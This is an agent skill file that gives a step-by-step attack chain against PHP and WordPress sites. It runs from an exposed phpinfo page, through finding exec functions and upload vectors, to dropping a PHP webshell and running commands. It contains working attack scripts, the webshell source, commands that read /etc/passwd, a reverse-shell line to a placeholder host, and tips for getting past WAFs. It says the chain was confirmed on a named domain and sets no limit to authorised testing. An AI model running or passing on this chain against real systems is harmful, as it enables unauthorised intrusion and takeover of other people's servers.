---
name: phpinfo-to-rce
description: Chain phpinfo to RCE via exec check when info.php exposed.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  hermes:
    tags: [recon, phpinfo, RCE, wordpress, chain]
    category: recon
    related_skills:
      - source-leak-hunt
      - xmlrpc-exploitation
      - wordpress-full-compromise
      - cross-attack-chains
      - error-log-mining
---

# PHPInfo → RCE Chain Skill

Exploit chain that starts with an exposed `info.php`/`phpinfo.php` and escalates to remote code execution. When phpinfo reveals that `disable_functions` does NOT block exec functions (`exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`), the target is 1 upload away from full RCE. Confirmed on wines.com (PHP 7.3.29, all exec functions available).

## When to Use

- `source-leak-hunt` flags a target with `info.php` or `phpinfo.php` exposed.
- You need to confirm whether RCE is possible before investing in upload vectors.
- Building an attack chain that requires code execution.
- Target has a file upload path (open registration + XMLRPC, contact form, profile image, etc.).

## Prerequisites

- `terminal` tool with curl.
- Confirmed exposed phpinfo page (HTTP 200, contains "PHP Version").
- For RCE: a file upload vector on the same host (XMLRPC with credentials, open registration, contact form, etc.).

## How to Run

```bash
# Step 1: Fetch phpinfo and check for exec restrictions
curl -sk "https://TARGET/info.php" | grep -i "disable_functions"

# Step 2: If ONLY pcntl_* is disabled, all exec functions are available
# Step 3: Find upload vector and deliver webshell
```

## Quick Reference

| Check | What to Look For | Implication |
|-------|-----------------|-------------|
| `disable_functions` | Only `pcntl_alarm,pcntl_fork,...` | All exec available — RCE possible |
| `disable_functions` | `exec,system,passthru,shell_exec,popen,proc_open` | Exec blocked — need bypass |
| `allow_url_fopen` | On | Remote file inclusion possible |
| `allow_url_include` | On | RFI directly possible |
| `open_basedir` | Not set or `/var/www:/tmp` | Wide file access |
| `display_errors` | On | Error-based information disclosure |
| `DOCUMENT_ROOT` | `/var/www/html` or custom | Know where webshell lands |
| `SERVER_ADMIN` | Email address | Contact for social engineering |
| `_SERVER["REMOTE_ADDR"]` | Shows YOUR IP (if behind proxy) | WAF/CDN detection |
| PHP version | < 7.4 | EOL — more unpatched CVEs |

## Procedure

### Step 1 — Fetch and Analyze PHPInfo

```bash
TARGET="$1"

# Full phpinfo dump
curl -sk --max-time 15 "https://$TARGET/info.php" > /tmp/phpinfo_$TARGET.html
curl -sk --max-time 15 "https://$TARGET/phpinfo.php" >> /tmp/phpinfo_$TARGET.html 2>/dev/null

# Check if phpinfo is real (not SPA catch-all)
if ! grep -q "PHP Version" /tmp/phpinfo_$TARGET.html; then
  echo "[-] Not a real phpinfo page"
  exit 1
fi

echo "[+] PHPInfo confirmed on $TARGET"
echo ""

# Extract critical directives
echo "=== PHP Version ==="
grep -oP 'PHP Version <.*?>[^<]+' /tmp/phpinfo_$TARGET.html | head -1

echo ""
echo "=== disable_functions ==="
DISABLED=$(grep -A1 'disable_functions' /tmp/phpinfo_$TARGET.html | grep -oP '>(local|master).*?<' | sed 's/[<>]//g')
echo "$DISABLED"

echo ""
echo "=== Exec Functions Available? ==="
if echo "$DISABLED" | grep -qE 'exec|system|passthru|shell_exec|popen|proc_open'; then
  echo "[-] Exec functions ARE disabled — RCE blocked via standard methods"
else
  echo "[+] Exec functions NOT disabled — RCE POSSIBLE!"
  echo "[+] Available: exec, system, passthru, shell_exec, popen, proc_open"
fi

echo ""
echo "=== Other Critical Settings ==="
grep -E '(allow_url_fopen|allow_url_include|open_basedir|display_errors|DOCUMENT_ROOT|SERVER_ADMIN|upload_max_filesize|post_max_size)' /tmp/phpinfo_$TARGET.html | \
  sed 's/<[^>]*>//g' | sed 's/\s\+/ /g' | sort -u
```

### Step 2 — Assess RCE Viability

```bash
# Decision matrix:
# 1. Exec functions NOT disabled → RCE possible with ANY upload vector
# 2. Exec functions disabled → Check for bypass techniques:
#    - LD_PRELOAD bypass (if putenv() not disabled)
#    - FFI bypass (PHP 7.4+ with FFI enabled)
#    - proc_open bypass (sometimes missed in disable_functions)
#    - mail() + sendmail_path abuse

# Quick check for LD_PRELOAD bypass viability
if ! echo "$DISABLED" | grep -q "putenv"; then
  echo "[+] putenv() available — LD_PRELOAD bypass possible"
fi

# Quick check for FFI bypass
if grep -q "FFI" /tmp/phpinfo_$TARGET.html && ! echo "$DISABLED" | grep -q "FFI"; then
  echo "[+] FFI enabled — FFI bypass possible (PHP 7.4+)"
fi
```

### Step 3 — Find Upload Vector

```bash
TARGET="$1"

echo "[*] Searching for upload vectors on $TARGET..."

# Check WordPress open registration
REG=$(curl -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
[[ -n "$REG" ]] && echo "[+] Open WP registration — can upload via XMLRPC wp.uploadFile"

# Check XMLRPC with wp.uploadFile
XMLRPC_METHODS=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -o 'wp.uploadFile')
[[ -n "$XMLRPC_METHODS" ]] && echo "[+] XMLRPC wp.uploadFile available"

# Check for contact form file upload
curl -sk "https://$TARGET/contact" | grep -iE 'type=.file|enctype=.multipart' && \
  echo "[+] Contact form with file upload"

# Check Elementor upload (if plugin present)
curl -sk "https://$TARGET/wp-json/elementor/v1/globals" | grep -q "elementor" && \
  echo "[+] Elementor detected — check for upload endpoints"

# Check Gravity Forms
curl -sk "https://$TARGET/wp-json/gf/v2/forms" | grep -q "id" && \
  echo "[+] Gravity Forms detected — check for file upload fields"
```

### Step 4 — Deliver Webshell

If upload vector found (e.g., XMLRPC + open registration):

```bash
TARGET="$1"

# Generate simple PHP webshell
cat > /tmp/ws.php << 'EOF'
<?php
$c = $_REQUEST['c'];
if($c) { system($c); } else { echo "<!-- OK -->"; }
?>
EOF

# If XMLRPC wp.uploadFile is available (see xmlrpc-exploitation skill for full flow):
# 1. Register user via open registration
# 2. Upload webshell via XMLRPC
# 3. Access at /wp-content/uploads/YYYY/MM/ws.php?c=id

echo "[*] Webshell ready at /tmp/ws.php"
echo "[*] Use xmlrpc-exploitation skill for the full upload chain"
echo "[*] Or adapt to the specific upload vector found above"
```

### Step 5 — Verify RCE

```bash
TARGET="$1"
WEBSHELL_URL="$2"  # e.g., https://TARGET/wp-content/uploads/2026/06/ws.php

# Test command execution
curl -sk "$WEBSHELL_URL?c=id"
curl -sk "$WEBSHELL_URL?c=uname -a"
curl -sk "$WEBSHELL_URL?c=cat /etc/passwd | head -5"

# Establish reverse shell (if outbound connections allowed)
# On your listener: nc -lvnp 4444
# curl -sk "$WEBSHELL_URL?c=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261'"
```

## Pitfalls

- **phpinfo behind WAF:** Cloudflare may cache phpinfo or block certain paths. Try `/test.php`, `/php_info.php`, `/info.php?1`.
- **disable_functions bypass complexity:** LD_PRELOAD bypass requires compiling a .so file matching the target's architecture and libc. FFI bypass requires PHP 7.4+ and `FFI::cdef()` not in disable_functions.
- **Upload path discovery:** WordPress stores uploads in `/wp-content/uploads/YYYY/MM/`. Some hosts change this via `UPLOADS` constant (check phpinfo).
- **Webshell blocked by WAF:** If the host has mod_security or a WAF, the PHP webshell may be blocked on access. Try alternative extensions (.phtml, .php5, .pht) or obfuscated payloads.

## Verification

- PHPInfo MUST be real (contains "PHP Version" text, not SPA catch-all).
- `disable_functions` analysis MUST confirm at least one exec function is available.
- Uploaded webshell MUST return `id` or `whoami` output proving code execution.
- Document the full chain: phpinfo → disable_functions analysis → upload vector → webshell → RCE.
